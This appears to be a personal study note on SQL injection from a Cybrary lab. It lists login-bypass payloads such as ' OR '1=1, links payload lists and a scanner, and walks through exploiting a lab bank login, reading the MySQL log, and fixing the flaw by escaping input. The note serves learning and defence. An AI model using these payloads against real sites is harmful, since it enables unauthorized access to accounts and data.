[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)  
[https://github.com/payloadbox/sql-injection-payload-list#generic-sql-injection-payloads](https://github.com/payloadbox/sql-injection-payload-list#generic-sql-injection-payloads)  
  
Automatic - Damn Small SQLi Scanner  
Github: [https://github.com/stamparm/DSSS](https://github.com/stamparm/DSSS)  
Quick install: git clone https://github.com/stamparm/DSSS.git && cd DSSS/  
  
[https://suip.biz/?act=sqlmap](https://suip.biz/?act=sqlmap)  
  
within the browser  
<username>' OR '1=1  
'or 1 -- -  
1 or 1=1-- -  
1' or '1'='1'-- -  
  
  
sql syntax  
  
From Cybrary SQL Injection Lab  
login to mySQL  
$ mysql --user=root --password=P@ssw0rd  
  
view all of MySQL variable settings  
>SHOW VARIABLES  
  
display any row that contains the word “general” in it.  
> SHOW VARIABLES LIKE '%general%';  
  
enable the general log.  
> SET GLOBAL general_log = 1;  
  
view all of MySQL variable settings again to confirm value on  
>SHOW VARIABLES  
  
quit mySQL interactive mode  
>\q  
  
on the bank website - Login with Bob in the Username field and type p@ssword1 into the Password field  
  
view the last four lines of the log file. Enter P@ssw0rd when prompted.  
$sudo tail -4 /var/lib/mysql/Web.log  
![[b56669b6992cfc1116f09bfebb47093e.png]]

(https://lab.infoseclearning.com/sites/default/files/u766/Capstone/expected%20query.PNG)  
  
On the bank website - Login with Alice' OR '1=1  
view the last four lines of the log file. Enter P@ssw0rd when prompted.  
$sudo tail -4 /var/lib/mysql/Web.log  
![[90ff584d39c2f3e3b68a1fa1037c6c5e.png]]
(https://lab.infoseclearning.com/sites/default/files/u98/SQL_Injection/image028.jpg)  
  
mitigate attack  
open the action script into nano and provide your sudo password if prompted.  
$ sudo nano –c /var/www/WebServer/checklogin.php  
uncomment under  
//Escape variables; Formulate and send MySQL query  
save  
  
try to use the exploit and it won't work  
  
view the last four lines of the log file. Enter P@ssw0rd when prompted.  
$sudo tail -4 /var/lib/mysql/Web.log  
![[5f97499c9a9321272b6f73c8c8cf74a1.png]]
(https://lab.infoseclearning.com/sites/default/files/u98/SQL_Injection/image034.jpg)